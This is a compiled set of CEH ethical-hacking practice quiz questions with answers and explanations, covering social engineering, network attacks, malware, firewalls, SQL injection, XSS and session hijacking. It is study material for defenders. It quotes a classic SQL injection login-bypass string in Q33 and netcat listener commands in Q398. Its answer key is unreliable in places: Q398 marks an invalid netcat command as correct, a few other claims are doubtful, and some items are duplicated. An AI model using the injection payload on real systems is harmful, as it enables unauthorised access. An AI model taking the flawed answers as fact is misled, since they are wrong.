**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q411
**Baiting attacks rely on what?**

- A) Fake websites
- B) Curiosity or greed
- C) Server misconfigurations
- D) Network congestion

**Answer:** B
**Explanation:** Baiting exploits human curiosity or greed by offering something enticing (free USB drives, downloads, prizes) to lure victims into a trap where their information is harvested or malware is installed.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q412
**Tailgating involves:**

- A) Password cracking
- B) Following someone into a restricted area
- C) Port scanning
- D) Malware deployment

**Answer:** B
**Explanation:** Tailgating (also called piggybacking) involves gaining unauthorized physical access to restricted areas by following closely behind an authorized person, often relying on their courtesy to hold the door open.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q413
**Which of the following is NOT a social engineering example?**

- A) Phishing
- B) Shoulder surfing
- C) Denial of Service
- D) Tailgating

**Answer:** C
**Explanation:** Denial of Service (DoS) overwhelms systems with traffic and is a technical network attack. Phishing deceives via messages, shoulder surfing observes screens/keyboards, and tailgating follows authorized personnel -- all exploit human behavior.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q414
**Social engineering provides information about:**

- A) Computer information
- B) Social media information
- C) Human being information
- D) Post/camera information

**Answer:** C
**Explanation:** Social engineering exploits the human element of security by manipulating people into divulging confidential information. It targets human psychology and behavior rather than technical systems.
**Source:** Sulekha - CEH Exam Questions

---

## Q415
**An attacker draws attention to a cause by performing cyber attacks. What type of attacker is this?**

- A) Criminal
- B) Terrorist
- C) Hacktivist
- D) Script kiddie

**Answer:** C
**Explanation:** A hacktivist performs cyber attacks to promote political, social, or ideological causes. Criminals seek financial gain. Terrorists aim to cause fear and disruption. Script kiddies use pre-made tools without deep understanding.
**Source:** Sulekha - CEH Exam Questions

---

## Q416
**What is the knowledge level of a script kiddie?**

- A) High
- B) Average
- C) Low
- D) Advanced

**Answer:** C
**Explanation:** Script kiddies have low technical knowledge and rely on pre-written tools, scripts, and exploits created by more skilled hackers. They lack the ability to develop their own attack tools or understand underlying vulnerabilities.
**Source:** Sulekha - CEH Exam Questions

---

## Q417
**An ethical hacker must have _______ before accessing a target system.**

- A) Training
- B) Permission
- C) Planning
- D) All of the above

**Answer:** B
**Explanation:** Written permission (authorization) is the absolute requirement that distinguishes ethical hacking from criminal hacking. Without explicit permission, accessing a system is illegal regardless of training or planning.
**Source:** Sulekha - CEH Exam Questions

---

## Q418
**A white box test requires:**

- A) Some knowledge of the target
- B) Complete knowledge of the target
- C) No knowledge of the target
- D) Only permission

**Answer:** B
**Explanation:** White box testing (also called clear box) provides the tester with complete knowledge of the target including source code, network diagrams, and credentials. Black box has no knowledge. Gray box has partial knowledge.
**Source:** Sulekha - CEH Exam Questions

---

## Q419
**What are the stages of hacking in order?**

- A) Surveillance
- B) Scanning
- C) Getting access
- D) Maintaining access and covering tracks
- E) All of the above

**Answer:** E
**Explanation:** The five phases of ethical hacking are: 1) Reconnaissance/Surveillance, 2) Scanning, 3) Gaining Access, 4) Maintaining Access, and 5) Covering Tracks. These phases are sequential and systematic.
**Source:** Sulekha - CEH Exam Questions

---

## Q420
**The most secure Wi-Fi standard today is:**

- A) WEP
- B) WPA
- C) WPA2
- D) WPA3

**Answer:** D
**Explanation:** WPA3 provides the most enhanced Wi-Fi security with Simultaneous Authentication of Equals (SAE), 192-bit encryption for enterprise, and protection against offline dictionary attacks. WEP is broken. WPA has known weaknesses. WPA2 is less secure than WPA3.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q421
**The network team has established procedures requiring manager approval before implementing new firewall rules. You notice a recently implemented rule without approval. What is the best step?**

- A) Have the network team document why the rule was implemented without approval
- B) Monitor all traffic using the firewall rule until a manager can approve it
- C) Do not roll back the rule as the business may rely on it, but try to get approval soon
- D) Immediately roll back the firewall rule until a manager can approve it

**Answer:** D
**Explanation:** Change management procedures must be followed. Unauthorized changes should be immediately rolled back to maintain security policy compliance. Allowing unauthorized rules to persist creates security risks regardless of business impact.
**Source:** Pass4Success - CEH 312-50

---

## Q422
**After a security risk assessment shows risk decreased from 50% to 10% (below the 20% threshold), which risk decision is best for business continuation with maximum profit?**

- A) Accept the risk
- B) Introduce more controls to bring risk to 0%
- C) Mitigate the risk
- D) Avoid the risk

**Answer:** A
**Explanation:** Since the risk (10%) is now below the acceptable threshold (20%), accepting the remaining residual risk is the most cost-effective strategy. Attempting to eliminate all risk (0%) is impractical and expensive. Further mitigation adds cost without proportional benefit.
**Source:** Pass4Success - CEH 312-50

---

## Q423
**Which is NOT a device considered part of the Internet of Things (IoT)?**

- A) Smartphone
- B) Thermostat
- C) Light bulb
- D) Set-top cable box

**Answer:** A
**Explanation:** Smartphones are general-purpose computing devices with their own operating systems and are not typically classified as IoT devices. IoT refers to everyday objects (thermostats, light bulbs, appliances) embedded with sensors and network connectivity.
**Source:** EDUSUM - EC-Council CEH Sample Questions

---

## Q424
**The DNS server where records for a domain belonging to an organization reside is called the ________ server.**

- A) Authoritative
- B) Recursive
- C) Caching
- D) Local

**Answer:** A
**Explanation:** An authoritative DNS server holds the official DNS records for a domain. Recursive servers query other servers on behalf of clients. Caching servers store recently looked-up records. Local servers serve a specific network segment.
**Source:** EDUSUM - EC-Council CEH Sample Questions

---

# Network & Perimeter Hacking (44 questions)

## Q78
**Which technique corrupts ARP caches to redirect traffic on a switched network?**

- A) DNS poisoning
- B) ARP poisoning/spoofing
- C) MAC flooding
- D) VLAN hopping

**Answer:** B
**Explanation:** ARP poisoning sends fake ARP replies to redirect traffic.
**Source:** CEH Study Guide

---

## Q79
**Key to session hijacking is determining what?**

- A) Victim's MAC address
- B) Initial sequence number (ISN)
- C) Victim's IP address
- D) Session cookie name

**Answer:** B
**Explanation:** TCP session hijacking requires predicting the initial sequence number.
**Source:** CEH Study Guide

---

## Q80
**Injecting packets without seeing responses. What type of hijacking?**

- A) Active session hijacking
- B) Blind hijacking
- C) Passive session hijacking
- D) Cross-site session hijacking

**Answer:** B
**Explanation:** Blind hijacking injects commands without receiving responses.
**Source:** CEH Study Guide

---

## Q81
**Which DDoS attack exploits the three-way handshake?**

- A) Smurf attack
- B) SYN flood
- C) Ping of death
- D) Teardrop attack

**Answer:** B
**Explanation:** SYN flood exhausts resources with half-open connections.
**Source:** CEH Study Guide

---

## Q82
**Splitting an attack across multiple small packets for IDS evasion. What technique?**

- A) Encryption
- B) Fragmentation
- C) Polymorphism
- D) Tunneling

**Answer:** B
**Explanation:** Fragmentation splits payloads hoping IDS won't reassemble them.
**Source:** CEH Study Guide

---

## Q83
**What is the purpose of a honeypot?**

- A) Encrypt traffic
- B) Attract and study attackers
- C) Filter spam
- D) Balance network load

**Answer:** B
**Explanation:** Honeypots are decoy systems designed to attract and study attackers.
**Source:** CEH Study Guide

---

## Q101
**Which firewall operates at OSI Layer 7?**

- A) Packet-filtering
- B) Stateful inspection
- C) Application-layer firewall
- D) Circuit-level gateway

**Answer:** C
**Explanation:** Application-layer firewalls inspect actual application data at Layer 7.
**Source:** CEH Study Guide

---

## Q102
**Injecting fraudulent DNS records into a caching server. What attack?**

- A) DNS tunneling
- B) DNS cache poisoning
- C) DNS zone transfer
- D) DNS amplification

**Answer:** B
**Explanation:** DNS cache poisoning injects fraudulent records into resolver cache.
**Source:** CEH Study Guide

---

## Q110
**Using XSS to steal a session cookie. What type of hijacking?**

- A) Network-level
- B) Application-level
- C) Blind
- D) Brute force

**Answer:** B
**Explanation:** Cookie theft via XSS is application-level session hijacking.
**Source:** CEH Study Guide

---

## Q111
**IDS that monitors network traffic for suspicious patterns?**

- A) HIDS
- B) NIDS
- C) WIDS
- D) File Integrity Monitor

**Answer:** B
**Explanation:** NIDS monitors network traffic for known attack signatures or anomalies.
**Source:** CEH Study Guide

---

## Q118
**Which tool captures and analyzes network packets in real-time?**

- A) Nmap
- B) Wireshark
- C) Metasploit
- D) John the Ripper

**Answer:** B
**Explanation:** Wireshark is the industry-standard packet capture and protocol analysis tool.
**Source:** CEH Study Guide

---

## Q127
**What order, from bottom to top, does the TCP/IP architecture use?**

- A) Network Access, Network, Transport, Application
- B) Link, Internet, Transport, Application
- C) Physical, Network, Session, Application
- D) Data Link, Internet, Transport, Application

**Answer:** B
**Explanation:** The TCP/IP model has four layers from bottom to top: Link (Network Access), Internet, Transport, and Application. Option C describes OSI model layers, not TCP/IP.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q130
**If you wanted a lightweight protocol to send real-time data over, which of these would you use?**

- A) TCP
- B) HTTP
- C) ICMP
- D) UDP

**Answer:** D
**Explanation:** UDP (User Datagram Protocol) is a lightweight, connectionless protocol ideal for real-time data like streaming or VoIP because it has lower overhead than TCP and does not require handshakes or acknowledgments.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q131
**An intrusion detection system can perform which of the following functions?**

- A) Block traffic
- B) Filter traffic based on headers
- C) Generate alerts on traffic
- D) Log system messages

**Answer:** C
**Explanation:** An IDS (Intrusion Detection System) monitors network traffic and generates alerts when suspicious activity is detected. It does not block or filter traffic - that is the function of an IPS or firewall.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q135
**The DNS server where records for a domain belonging to an organization or enterprise reside is called the ________ server.**

- A) Authoritative
- B) Recursive
- C) Caching
- D) Local

**Answer:** A
**Explanation:** An authoritative DNS server holds the actual DNS records for a domain. Recursive servers query other servers on behalf of clients. Caching servers store temporary copies of DNS lookups.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q140
**Which of the following is a type of denial of service (DoS) attack?**

- A) Smurf attack
- B) SQL injection
- C) Cross-site scripting
- D) Port scanning

**Answer:** A
**Explanation:** A Smurf attack is a type of denial of service attack that involves sending a large number of ICMP echo requests (pings) to a network broadcast address, with the source address spoofed to the victim's IP.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q142
**Which of the following techniques is used for passive network reconnaissance?**

- A) Port Scanning
- B) Ping sweep
- C) Banner grabbing
- D) Sniffing

**Answer:** D
**Explanation:** Passive reconnaissance techniques involve collecting information without actively engaging with the target system. Sniffing captures network traffic passively without sending any packets.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q174
**During a security assessment, you need to prove the vulnerability of session IDs to hijacking. Which method is most effective for capturing session IDs on an unsecured network?**

- A) Conducting a ping sweep to identify active sessions
- B) Using a packet sniffer to capture unencrypted session IDs
- C) Performing a SQL injection to extract session information
- D) Sending phishing emails to users on the network

**Answer:** B
**Explanation:** Packet sniffing allows the capture of unencrypted session IDs as they traverse the network, demonstrating their vulnerability to interception on unsecured networks.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-session-hijacking-1749512552516

---

## Q175
**A user reports suspicious account activity and suspects session hijacking. How can an ethical hacker verify if session hijacking occurred?**

- A) Check for unusual IP addresses in server logs
- B) Scan for open ports on the user's machine
- C) Look for signs of malware infection
- D) Perform a vulnerability scan on the user's browser

**Answer:** A
**Explanation:** Unusual IP addresses in server logs can indicate that a session was accessed from an unauthorized location, suggesting session hijacking has occurred.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-session-hijacking-1749512552516

---

## Q176
**What is the purpose of the 'HttpOnly' attribute in cookies concerning session security?**

- A) To prevent cookies from being sent over HTTP
- B) To prevent JavaScript access to cookies
- C) To ensure cookies are only sent to the same domain
- D) To encrypt cookies during transmission

**Answer:** B
**Explanation:** The 'HttpOnly' attribute prevents JavaScript from accessing cookies, reducing the risk of session hijacking through XSS (Cross-Site Scripting) attacks.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-session-hijacking-1749512552516

---

## Q177
**A company's web application is vulnerable to session fixation attacks. What is the most appropriate defense strategy to mitigate this risk effectively?**

- A) Implement HTTPS to encrypt all sessions
- B) Regenerate session IDs upon successful login
- C) Use strong password policies
- D) Enable Multi-Factor Authentication (MFA)

**Answer:** B
**Explanation:** Regenerating session IDs upon successful login prevents attackers from using pre-set (fixed) session IDs that they may have established before the user authenticated.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-session-hijacking-1749512552516

---

## Q178
**An attacker is attempting to perform session fixation on a target application. What is the primary goal of session fixation?**

- A) To cause a denial of service
- B) To steal encrypted credentials
- C) To force a user to use a known session ID
- D) To inject malicious code into the server

**Answer:** C
**Explanation:** Session fixation aims to force a user to use a session ID known to the attacker, so once the user authenticates, the attacker can hijack the authenticated session.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-session-hijacking-1749512552516

---

## Q222
**What are the correct ICMP types for a ping request and a ping response?**

- A) Type 5 request, Type 3 response
- B) Type 8 request, Type 0 response
- C) Type 3 request, Type 5 response
- D) Type 0 request, Type 8 response

**Answer:** B
**Explanation:** ICMP Type 8 is Echo Request (ping) and Type 0 is Echo Reply (pong). This is fundamental networking knowledge tested frequently on the CEH exam.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q253
**When a router is blocking ICMP, what reply codes would you receive?**

- A) Type 3 = Destination Unreachable / Code 13 = Communication Administratively Prohibited
- B) Type 0 = Echo Reply / Code 0 = No Error
- C) Type 8 = Echo Request / Code 0 = No Error
- D) Type 11 = Time Exceeded / Code 0 = TTL Expired

**Answer:** A
**Explanation:** ICMP Type 3 Code 13 indicates 'Communication Administratively Prohibited,' meaning a router or firewall is actively blocking the ICMP traffic via an access control list.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q256
**What ICMP command uses code Type 0 and Type 8?**

- A) Traceroute
- B) The ping command
- C) Netstat
- D) ARP

**Answer:** B
**Explanation:** The ping command uses ICMP Type 8 (Echo Request) to send a ping and expects ICMP Type 0 (Echo Reply) in response. Traceroute primarily uses Type 11 (Time Exceeded).
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q260
**What port number targets the Kerberos protocol?**

- A) 53
- B) 88
- C) 443
- D) 389

**Answer:** B
**Explanation:** Kerberos authentication protocol operates on port 88 (both TCP and UDP). Port 53 is DNS, 443 is HTTPS, and 389 is LDAP.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q264
**At which layer of the OSI model does a proxy operate?**

- A) Network layer
- B) Physical layer
- C) Data link layer
- D) Application layer

**Answer:** D
**Explanation:** Proxies operate at the Application layer (Layer 7) of the OSI model, as they handle application-level protocols like HTTP, HTTPS, and FTP.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q265
**MAC addresses are used to funnel traffic at which OSI layer?**

- A) Layer 1
- B) Layer 2
- C) Layer 3
- D) Layer 4

**Answer:** B
**Explanation:** MAC addresses operate at Layer 2 (Data Link layer) of the OSI model. Layer 2 devices like switches use MAC addresses to forward frames to the correct destination.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q270
**What port is used for SSL/TLS-encrypted web traffic?**

- A) 443
- B) 255
- C) 23
- D) 80

**Answer:** A
**Explanation:** Port 443 is the standard port for HTTPS (HTTP Secure) traffic. Port 80 is for unencrypted HTTP, port 23 is Telnet, and 255 is not a standard service port.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q392
**Which tool is widely used for packet sniffing?**

- A) Burp Suite
- B) Wireshark
- C) Hydra
- D) Nmap

**Answer:** B
**Explanation:** Wireshark is the world's foremost and most widely-used network protocol analyzer. It captures and interactively analyzes network traffic. Burp Suite tests web apps. Hydra cracks passwords. Nmap scans networks.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q393
**What is the purpose of sniffing?**

- A) Cracking passwords
- B) Capturing and analyzing network traffic
- C) Removing logs
- D) Installing rootkits

**Answer:** B
**Explanation:** Packet sniffing intercepts and examines data transmissions on a network. It can capture credentials, emails, files, and other sensitive data traveling across the network.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q394
**Which protocol is vulnerable to sniffing attacks?**

- A) HTTPS
- B) SSH
- C) Telnet
- D) FTPS

**Answer:** C
**Explanation:** Telnet transmits all data including credentials in cleartext, making it highly vulnerable to packet sniffing. HTTPS, SSH, and FTPS all use encryption to protect data in transit.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q395
**Packet sniffing is mostly performed in which mode?**

- A) Silent mode
- B) Monitor mode
- C) Active mode
- D) Binary mode

**Answer:** B
**Explanation:** Monitor mode (also called promiscuous mode for wired networks) enables the network interface card to capture all traffic on the network segment, not just traffic addressed to the host.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q396
**Which of the following is a passive network reconnaissance technique?**

- A) Port Scanning
- B) Ping sweep
- C) Banner grabbing
- D) Sniffing

**Answer:** D
**Explanation:** Sniffing is passive because it captures and analyzes network traffic without actively sending any traffic to the network. Port scanning, ping sweeps, and banner grabbing all actively probe the target.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q397
**Which of the following is a passive reconnaissance technique?**

- A) Port Scanning
- B) Social Engineering
- C) Sniffing
- D) SQL Injection

**Answer:** C
**Explanation:** Sniffing gathers information passively by capturing network traffic without engaging or alerting target systems. Port scanning actively probes targets. Social engineering interacts with people. SQL injection actively exploits applications.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q398
**How would you use Netcat to set up a listener on a system?**

- A) nc -l -p 192.168.1.1
- B) nc -l -p 1000
- C) nc -p -u 1000
- D) nc -l -p -t 192.168.1.1

**Answer:** A
**Explanation:** Netcat uses the 'nc -l -p' syntax to listen on a specific port. The -l flag sets listen mode and -p specifies the port number. This creates a listener that can receive incoming connections.
**Source:** Infibee - CEH Review Questions

---

## Q399
**Which malware spreads without needing a host file?**

- A) Virus
- B) Worm
- C) Trojan
- D) Rootkit

**Answer:** B
**Explanation:** Worms are self-replicating malware that propagate independently across networks without requiring a host file or user interaction. Viruses need host files. Trojans disguise as legitimate programs. Rootkits hide malicious activity.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q400
**What does ransomware do?**

- A) Deletes browser history
- B) Encrypts user data and demands payment
- C) Installs drivers
- D) Speeds up the system

**Answer:** B
**Explanation:** Ransomware encrypts victims' files and demands a ransom payment (typically in cryptocurrency) in exchange for the decryption key. Without the key, the encrypted files are inaccessible.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q401
**Which malware appears legitimate but contains malicious code?**

- A) Trojan
- B) Worm
- C) Botnet
- D) Adware

**Answer:** A
**Explanation:** Trojans disguise themselves as legitimate, useful programs to trick users into executing them. Once run, they can create backdoors, steal data, or download additional malware.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q402
**Which type of malware can spread rapidly across networks by exploiting vulnerabilities?**

- A) Adware
- B) Spyware
- C) Trojan
- D) Worm

**Answer:** D
**Explanation:** Worms spread rapidly and autonomously across networks by exploiting vulnerabilities or social engineering, without requiring human interaction to propagate from system to system.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q403
**What does IDS stand for?**

- A) Internet Detection System
- B) Intrusion Detection System
- C) Internal Defense Structure
- D) Integrated Data Service

**Answer:** B
**Explanation:** IDS stands for Intrusion Detection System. It monitors network traffic and system activities for malicious activity or policy violations and generates alerts.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q404
**What is the purpose of an IPS?**

- A) Blocking attacks in real time
- B) Storing logs
- C) Cracking passwords
- D) Running scripts

**Answer:** A
**Explanation:** An IPS (Intrusion Prevention System) actively monitors and blocks malicious traffic in real time, unlike an IDS which only detects and alerts. IPS sits inline with network traffic.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q405
**Which type of firewall checks the connection state?**

- A) Stateless
- B) Stateful
- C) Hardware
- D) Cloud

**Answer:** B
**Explanation:** Stateful firewalls track the state of active connections and make filtering decisions based on connection context (SYN, SYN-ACK, ACK sequence). Stateless firewalls evaluate packets individually without connection tracking.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q406
**Firewalls primarily work at which OSI layer?**

- A) Session
- B) Transport
- C) Network
- D) Application

**Answer:** C
**Explanation:** Traditional firewalls primarily operate at the Network layer (Layer 3) of the OSI model, filtering traffic based on IP addresses, ports, and protocols. Next-generation firewalls can also operate at higher layers.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

# Web Application Hacking (36 questions)

## Q31
**What type of scan sends a SYN packet and waits for SYN-ACK or RST?**

- A) SYN scan
- B) TCP connect scan
- C) ACK scan
- D) Xmas scan

**Answer:** A
**Explanation:** SYN scan sends SYN and analyzes response: SYN-ACK means open, RST means closed.
**Source:** CehTest.com

---

## Q32
**Which type of SQL injection relies on server response time to infer information?**

- A) Union-based SQL injection
- B) Error-based SQL injection
- C) Blind time-based SQL injection
- D) Out-of-band SQL injection

**Answer:** C
**Explanation:** Time-based blind SQL injection uses conditional delays to infer conditions.
**Source:** ExamTopics

---

## Q33
**An attacker inserts ' OR '1'='1' -- into a web form. What attack is this?**

- A) Cross-site scripting
- B) SQL injection
- C) Command injection
- D) LDAP injection

**Answer:** B
**Explanation:** Classic SQL injection payload that always evaluates to TRUE, bypassing authentication.
**Source:** CEH Study Guide

---

## Q34
**What is the BEST countermeasure against SQL injection?**

- A) Input validation and parameterized queries
- B) Using HTTPS
- C) Installing a firewall
- D) Disabling JavaScript

**Answer:** A
**Explanation:** Parameterized queries prevent SQL injection by separating code from data.
**Source:** OWASP/CEH Study Guide

---

## Q35
**An attacker injects a script into a forum post that executes when others view it. What attack?**

- A) Reflected XSS
- B) Stored XSS
- C) DOM-based XSS
- D) CSRF

**Answer:** B
**Explanation:** Stored (persistent) XSS stores the script on the server, executing for all viewers.
**Source:** CEH Study Guide

---

## Q36
**What does CSRF exploit?**

- A) Web server vulnerabilities
- B) Trust a site has in the user's browser
- C) Weak encryption
- D) SQL injection vulnerabilities

**Answer:** B
**Explanation:** CSRF exploits the trust a website has in the user's authenticated browser session.
**Source:** CEH Study Guide

---

## Q95
**Web app reflects user input in error messages without sanitization. What vulnerability?**

- A) SQL injection
- B) Reflected XSS
- C) SSRF
- D) XML injection

**Answer:** B
**Explanation:** Reflected (non-persistent) XSS occurs when input is reflected without sanitization.
**Source:** CEH Practice Exam

---

## Q108
**Which tool is specifically for web server vulnerability scanning?**

- A) Nmap
- B) Nikto
- C) Metasploit
- D) Wireshark

**Answer:** B
**Explanation:** Nikto scans for dangerous files, outdated software, and misconfigurations.
**Source:** CEH Study Guide

---

## Q121
**Primary purpose of a WAF?**

- A) Block all HTTP traffic
- B) Filter and monitor HTTP traffic
- C) Encrypt web traffic
- D) Manage DNS records

**Answer:** B
**Explanation:** WAF protects web applications by filtering malicious HTTP/HTTPS traffic.
**Source:** CEH Study Guide

---

## Q139
**Which of the following techniques can be used to prevent SQL injection attacks?**

- A) Encrypting network traffic
- B) Implementing a firewall
- C) Input validation
- D) Installing antivirus software

**Answer:** C
**Explanation:** Input validation is a technique that ensures user input is validated and sanitized before being transmitted to the database, preventing malicious SQL code from being injected.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q144
**Which of the following techniques can be used to prevent buffer overflow attacks?**

- A) Input validation
- B) Brute force attack
- C) Man-in-the-middle attack
- D) Social engineering attack

**Answer:** A
**Explanation:** Input validation checks that input data remains within expected parameters before processing, preventing buffer overflow by ensuring data does not exceed allocated buffer sizes.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q150
**Which of the following is a type of attack that can be used to exploit a buffer overflow vulnerability?**

- A) Cross-site scripting
- B) SQL injection
- C) DNS spoofing
- D) Shellcode injection

**Answer:** D
**Explanation:** Shellcode injection is a technique that involves injecting malicious code into a program's memory space through a buffer overflow vulnerability, allowing arbitrary code execution.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q154
**Which of the following is a common web application vulnerability?**

- A) Cross-site scripting (XSS)
- B) DNS spoofing
- C) SYN flood
- D) Ping of Death

**Answer:** A
**Explanation:** Cross-site scripting (XSS) is a vulnerability in web applications where an attacker can inject malicious client-side scripts into web pages viewed by other users.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q165
**Which of the following is a common sign that a web application might be vulnerable to SQL injection?**

- A) The application uses HTTPS for data transmission
- B) The application displays error messages with SQL syntax
- C) The application has a CAPTCHA on login forms
- D) The application redirects to a secure page after login

**Answer:** B
**Explanation:** Error messages with SQL syntax can indicate that the application is processing SQL queries directly with user input without proper sanitization, a potential SQL injection vulnerability.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-sql-injection-1749512592477

---

## Q166
**A client-side web application is suspected of being vulnerable to SQL injection. What is a potential impact if this vulnerability is exploited?**

- A) The web server's IP address is exposed
- B) Sensitive data from the database can be extracted
- C) Client-side scripts are executed on the user's browser
- D) The server's SSL certificate is compromised

**Answer:** B
**Explanation:** SQL injection can lead to unauthorized access and extraction of sensitive data from the database, including user credentials, personal information, and financial data.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-sql-injection-1749512592477

---

## Q167
**While conducting a vulnerability assessment, you find a parameter that echoes back database error messages. How can this information be used to further exploit SQL Injection?**

- A) Use the error messages to refine injection payloads for blind SQL Injection
- B) Use the error messages to launch a DDoS attack
- C) Use the error messages to perform a phishing attack
- D) Use the error messages to identify XSS vulnerabilities

**Answer:** A
**Explanation:** Database error messages can provide insights into the database structure, table names, and column names, allowing for more precise SQL Injection payloads.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-sql-injection-1749512592477

---

## Q168
**During a penetration test, you discover that a web application is vulnerable to SQL injection. Which of the following techniques would allow you to extract data from the database?**

- A) Using a UNION-based injection to retrieve database tables
- B) Performing a SYN flood attack to disrupt the database connection
- C) Utilizing XSS to execute scripts on the database server
- D) Deploying a DDoS attack to overload the web server

**Answer:** A
**Explanation:** UNION-based SQL injection allows attackers to combine results from multiple SELECT statements to extract data from different database tables in a single query.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-sql-injection-1749512592477

---

## Q201
**You are conducting a penetration test on a web server and find that it is vulnerable to the Heartbleed bug. Which of the following actions should you recommend to rectify this issue?**

- A) Disable SSL altogether
- B) Update OpenSSL to a version patched against Heartbleed
- C) Restrict access to the server using IP whitelisting
- D) Use a web application firewall to block exploitation attempts

**Answer:** B
**Explanation:** Patching OpenSSL is the proper remediation for Heartbleed. Disabling SSL removes security entirely, IP restrictions and WAF rules are only temporary mitigations that don't fix the root cause.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-hacking-web-servers-1749512576073

---

## Q202
**You are tasked with testing the security of a web server that may have directory traversal vulnerabilities. What is the best approach to verify this vulnerability?**

- A) Attempt to upload a malicious script and execute it
- B) Use a web proxy to modify requests and attempt to access sensitive files using '../' sequences
- C) Use a SQL injection tool to test database security
- D) Run a denial-of-service attack to check server resilience

**Answer:** B
**Explanation:** Web proxies like Burp Suite enable manual insertion of directory traversal sequences (../) to directly verify whether the server allows unauthorized file access outside the web root.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-hacking-web-servers-1749512576073

---

## Q203
**A client reports that their web server is vulnerable to the 'Shellshock' bug. Which component is primarily affected by this vulnerability?**

- A) Apache HTTP Server
- B) Bash Shell
- C) OpenSSL
- D) PHP Script

**Answer:** B
**Explanation:** The 'Shellshock' bug (CVE-2014-6271) is a vulnerability in the Bash shell, which can be exploited via CGI scripts on web servers to execute arbitrary commands.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-hacking-web-servers-1749512576073

---

## Q204
**Which of the following measures can help mitigate the risk of cross-site request forgery (CSRF) attacks?**

- A) Using strong passwords
- B) Implementing HTTPS
- C) Validating user input
- D) Using anti-CSRF tokens

**Answer:** D
**Explanation:** Anti-CSRF tokens verify request legitimacy by ensuring they originate from authenticated users' sessions. Password strength, HTTPS, and input validation address different security concerns.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-hacking-web-servers-1749512576073

---

## Q205
**Which of the following best describes a zero-day vulnerability?**

- A) A vulnerability that has been patched by the vendor
- B) A vulnerability that is publicly known but not yet patched
- C) A vulnerability that is privately known and not yet patched
- D) A vulnerability that has been exploited in the wild

**Answer:** C
**Explanation:** A zero-day vulnerability is a security flaw that is known to attackers but has not been disclosed to or patched by the vendor, leaving zero days for defense.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-hacking-web-servers-1749512576073

---

## Q223
**Which vulnerability affected Bash in 2014 and could be exploited via web server CGI scripts?**

- A) Shellshock
- B) Heartbleed
- C) Bashshell
- D) Poodle

**Answer:** A
**Explanation:** Shellshock (CVE-2014-6271) was a critical vulnerability in the Bash shell discovered in 2014. Heartbleed affected OpenSSL, and POODLE affected SSL 3.0.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q356
**What is the best method to prevent SQL injection attacks?**

- A) Encrypting network traffic
- B) Implementing a firewall
- C) Input validation
- D) Installing antivirus software

**Answer:** C
**Explanation:** Input validation (including parameterized queries and prepared statements) prevents malicious SQL code from being injected into database queries. Encryption protects data in transit. Firewalls filter network traffic. Antivirus detects malware.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q357
**SQL Injection occurs due to:**

- A) Weak firewalls
- B) Invalid input validation
- C) Wrong encryption
- D) VPN failures

**Answer:** B
